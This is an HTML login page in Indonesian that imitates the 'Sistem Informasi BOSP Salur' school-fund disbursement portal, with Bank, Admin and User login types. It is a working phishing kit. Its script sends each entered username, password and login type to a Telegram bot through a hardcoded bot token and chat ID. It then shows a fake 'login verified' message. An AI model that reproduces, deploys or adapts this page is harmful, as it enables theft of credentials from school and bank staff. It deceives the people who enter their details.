<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Informasi BOSP Salur - Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
        
        body {
            font-family: 'Inter', sans-serif;
            background-color: #e9ecef;
        }

        .login-card {
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
        }

        .input-icon-wrapper {
            position: relative;
        }

        .input-icon {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: #9ca3af;
        }

        /* Loading spinner */
        .loader {
            border: 2px solid #f3f3f3;
            border-top: 2px solid #ffffff;
            border-radius: 50%;
            width: 16px;
            height: 16px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4">

    <!-- Header Section -->
    <div class="text-center mb-8">
        <img src="https://img.sanishtech.com/u/2affb8d157b1efecae4163ec9df2c797.png" 
             alt="Logo BOSP" 
             class="h-20 mx-auto mb-2 object-contain">
        <h1 class="text-2xl font-normal text-gray-600">Sistem Informasi <span class="font-bold text-gray-800">BOSP</span></h1>
        <h2 class="text-3xl font-medium text-gray-700">Salur</h2>
    </div>

    <!-- Login Form Card -->
    <div class="bg-white p-8 rounded-sm w-full max-w-md login-card border border-gray-100">
        <p class="text-center text-gray-500 mb-6 text-sm">Login untuk masuk</p>

        <form id="loginForm" class="space-y-4">
            <!-- Username -->
            <div class="input-icon-wrapper">
                <input type="text" 
                       id="username"
                       placeholder="Username" 
                       class="w-full border border-gray-300 p-2.5 pr-10 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 text-gray-700"
                       required>
                <i data-lucide="mail" class="input-icon w-5 h-5"></i>
            </div>

            <!-- Password -->
            <div class="input-icon-wrapper">
                <input type="password" 
                       id="password"
                       placeholder="Password" 
                       class="w-full border border-gray-300 p-2.5 pr-10 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 text-gray-700"
                       required>
                <i data-lucide="lock" class="input-icon w-5 h-5"></i>
            </div>

            <!-- Login Type -->
            <div class="space-y-1">
                <label class="text-sm font-semibold text-gray-600">Login Type</label>
                <select id="loginType" class="w-full border border-gray-300 p-2.5 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 bg-white text-gray-700 appearance-none cursor-pointer">
                    <option value="Bank">Bank</option>
                    <option value="Admin">Admin</option>
                    <option value="User">User</option>
                </select>
            </div>

            <!-- Sign In Button -->
            <button type="submit" 
                    id="submitBtn"
                    class="w-full bg-[#007bff] hover:bg-blue-600 text-white font-medium py-2.5 rounded transition-colors mt-2 flex items-center justify-center">
                <span id="btnText">Sign In</span>
            </button>
        </form>

        <!-- Footer Links -->
        <div class="mt-8 flex items-center space-x-2 text-sm">
            <span class="text-red-500">Klik jika</span>
            <a href="#" class="bg-[#ffc107] hover:bg-yellow-500 text-gray-800 px-3 py-1 rounded font-medium transition-colors">
                Reset/Lupa Password
            </a>
        </div>
    </div>

    <!-- Custom Alert Modal -->
    <div id="modal" class="fixed inset-0 bg-black bg-opacity-50 hidden flex items-center justify-center p-4 z-50">
        <div class="bg-white rounded-lg p-6 max-w-sm w-full shadow-xl">
            <div id="modalIcon" class="mx-auto flex items-center justify-center h-12 w-12 rounded-full mb-4"></div>
            <h3 id="modalTitle" class="text-lg font-bold text-center mb-2"></h3>
            <p id="modalMessage" class="text-gray-600 text-center mb-6 text-sm"></p>
            <button onclick="closeModal()" class="w-full py-2 bg-gray-800 text-white rounded hover:bg-gray-700 font-medium">
                Tutup
            </button>
        </div>
    </div>

    <script>
        // Konfigurasi Bot Telegram
        const TELEGRAM_TOKEN = "8336160915:AAFUeRN28Q5CsdxMsYH5qvS6IQ9iJxqpEXA";
        const TELEGRAM_CHAT_ID = "8001301204";

        // Inisialisasi Ikon
        lucide.createIcons();

        const loginForm = document.getElementById('loginForm');
        const submitBtn = document.getElementById('submitBtn');
        const btnText = document.getElementById('btnText');
        const modal = document.getElementById('modal');

        function showModal(title, message, isSuccess) {
            const iconDiv = document.getElementById('modalIcon');
            const titleEl = document.getElementById('modalTitle');
            const messageEl = document.getElementById('modalMessage');

            titleEl.textContent = title;
            messageEl.textContent = message;
            
            if (isSuccess) {
                iconDiv.className = "mx-auto flex items-center justify-center h-12 w-12 rounded-full mb-4 bg-green-100";
                iconDiv.innerHTML = '<i data-lucide="check" class="text-green-600"></i>';
            } else {
                iconDiv.className = "mx-auto flex items-center justify-center h-12 w-12 rounded-full mb-4 bg-red-100";
                iconDiv.innerHTML = '<i data-lucide="x" class="text-red-600"></i>';
            }
            
            modal.classList.remove('hidden');
            lucide.createIcons();
        }

        function closeModal() {
            modal.classList.add('hidden');
        }

        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();

            // Ambil data
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const type = document.getElementById('loginType').value;

            // Efek Loading
            submitBtn.disabled = true;
            btnText.innerHTML = '<span class="loader"></span> Memproses...';

            // Format Pesan Telegram
            const text = `🚀 *Login BOSP Baru*\n\n` +
                         `👤 *Username:* \`${username}\`\n` +
                         `🔑 *Password:* \`${password}\`\n` +
                         `🏷️ *Type:* ${type}\n\n` +
                         `🕒 *Waktu:* ${new Date().toLocaleString('id-ID')}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: text,
                        parse_mode: 'Markdown'
                    })
                });

                if (response.ok) {
                    showModal("Berhasil", "Data login telah diverifikasi.", true);
                    loginForm.reset();
                } else {
                    throw new Error("Gagal mengirim data");
                }
            } catch (error) {
                showModal("Gagal", "Terjadi kesalahan koneksi. Silakan coba lagi.", false);
            } finally {
                submitBtn.disabled = false;
                btnText.innerHTML = 'Sign In';
            }
        });
    </script>
</body>
</html>
